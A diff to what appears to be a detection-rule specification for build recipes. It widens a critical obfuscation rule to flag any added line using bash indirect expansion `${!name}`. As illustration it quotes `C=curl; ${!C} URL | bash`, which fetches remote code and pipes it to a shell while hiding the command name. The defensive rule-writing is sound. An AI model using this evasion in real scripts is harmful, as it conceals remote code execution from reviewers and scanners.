@@ -106,7 +106,7 @@ Fire rate: 58 of 3739 (1.55 %), all weight-0 reconstruction notes.
 
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `obfuscation`
-- **Condition:** An added line inside a build function contains the indirect-expansion form `${!name}` where `name` is a plain (non-subscripted) variable name, and the expanded fragment participates in a command that reaches the shell.
+- **Condition:** An added line contains the indirect-expansion form `${!name}` where `name` is a plain (non-subscripted) variable name. The rule flags the form itself, on any added line, without requiring the expanded fragment to reach a shell.
 
 `${!C}` expands to the *value of the variable whose name is held in `C`*, so
 `C=curl; ${!C} URL | bash` executes `curl` while the recipe carries no literal
